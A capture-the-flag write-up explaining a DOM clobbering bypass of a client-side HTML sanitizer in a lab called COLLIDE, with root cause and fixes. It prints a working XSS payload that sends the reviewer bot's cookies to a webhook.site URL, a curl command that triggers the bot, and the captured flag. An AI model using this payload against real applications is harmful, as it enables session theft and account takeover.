# COLLIDE DOM Clobbering Sanitizer Bypass

## What Is Happening

The [COLLIDE lab](https://d3f592890f21.pwnbox-lab.com/) lets an authenticated user upload an HTML or SVG snippet, preview it at `/p/<id>`, and report that preview URL to a reviewer bot.

The preview page fetches the stored snippet text from `/raw/<id>` and renders it client-side through `window.setHTML(target, rawText)`. That helper comes from `sanitizer.js`, which parses the snippet into a `<template>`, walks the element tree, removes dangerous tags and attributes, and finally mounts the sanitized fragment into the preview DOM.

The bug is that the sanitizer can be defeated by **DOM clobbering** on a denied `<form>` element.

## Why It Happens

The sanitizer makes two unsafe assumptions:

1. If an element is in `HARD_DENY`, it can be queued for later removal immediately:

```javascript
if (HARD_DENY.has(tag)) { drop.push(n); continue; }
```

2. Later removal via the element's own `remove()` method is trustworthy:

```javascript
drop.forEach(function (el) { try { el.remove(); } catch (_) {} });
```

That control flow means a denied node never reaches the attribute-scrubbing loop:

```javascript
if (an.indexOf('on') === 0) n.removeAttribute(a.name);
```

So if the denied node can survive cleanup, its event handlers survive too.

Forms expose named descendants as properties. With this payload:

```html
<form onfocus="fetch('https://webhook.site/d6bb003f-7359-4aea-9f93-833163050bf5?c='+document.cookie)" autofocus tabindex="1"><input id="remove"></form>
```

the child `<input id="remove">` shadows `form.remove`. When the sanitizer later calls `el.remove()`, cleanup fails and the `try/catch` suppresses the error. The form remains in the DOM with its `onfocus` handler intact.

Because the form is also `autofocus`, the reviewer browser triggers the `focus` event automatically after insertion, and the JavaScript runs without manual interaction.

## Exact Test

Upload the payload as an HTML snippet:

```html
<form onfocus="fetch('https://webhook.site/d6bb003f-7359-4aea-9f93-833163050bf5?c='+document.cookie)" autofocus tabindex="1"><input id="remove"></form>
```

Then report the resulting preview URL to the bot:

```bash
curl -sS -X POST "https://d3f592890f21.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://d3f592890f21.pwnbox-lab.com/p/2ed2e84a6b3ebbf2534d7d31"}'
```

## Expected Signal

- The preview sanitizer should have removed `<form>` entirely, but due to clobbering it survives.
- The reviewer visit should trigger the `focus` event automatically because of `autofocus`.
- The webhook should receive the reviewer's readable cookie value.

## Result Interpretation

Confirmed exploit chain:

```text
HTML snippet upload
-> preview page fetches raw snippet
-> sanitizer marks <form> for removal before stripping onfocus
-> <input id="remove"> clobbers form.remove
-> cleanup silently fails
-> surviving form is inserted into the preview DOM
-> autofocus fires onfocus in reviewer context
-> document.cookie is exfiltrated
```

Webhook result:

```text
flag=pwnbox{05c9d2a86f4b8e731ad06ce3b8f24107}
```

## Root Cause

The sanitizer trusted attacker-controlled DOM instance methods and treated cleanup failure as non-fatal. At the same time, it skipped attribute stripping for nodes already marked as denied. That combination let a forbidden form survive with a live event handler.

## Impact

- Same-origin JavaScript execution in the reviewer bot's browser.
- Theft of readable cookies from the reviewer session.
- In a real review application, likely reviewer account compromise or unauthorized actions in the preview origin.

## Fix

- Strip dangerous attributes even on nodes that will be dropped.
- Use prototype-safe DOM operations such as `Element.prototype.remove.call(el)`.
- Fail closed if a denied node cannot be removed.
- Add browser-based regression tests for form-property DOM clobbering cases.

## Key Lesson

A sanitizer is not safe just because it has a denylist. If it performs security-sensitive actions through live DOM instance properties on attacker-created nodes, DOM clobbering can turn a "remove this node" path into an XSS primitive.

## Flag

`pwnbox{05c9d2a86f4b8e731ad06ce3b8f24107}`
